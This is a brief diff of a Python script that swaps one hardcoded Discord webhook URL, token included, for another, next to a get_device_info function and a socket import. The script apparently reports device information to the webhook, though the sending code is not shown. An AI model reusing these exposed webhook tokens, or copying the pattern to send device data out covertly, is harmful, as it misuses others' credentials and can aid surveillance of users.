@@ -4,7 +4,7 @@ import time
 import socket
 from tqdm import tqdm
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1414659884317802728/5Kwn9NVvA0fvQZBUaQqhJS78NrggzvNxw2ctFBSEjcxqx2K-6qfMYW_9J8uGFnaSwWdi"  # Senin webhook adresin burada kalacak
+WEBHOOK_URL = "https://discord.com/api/webhooks/1414709102415708260/fchkKmLpaYQDW09genXyEsvB3V6eerwvAuVxBPeQlve6h8sD31aowoM2pLbTefuWe0pl"  # Senin webhook adresin burada kalacak
 
 def get_device_info():
     # Cihaz bilgisi fonksiyonu (örnek)
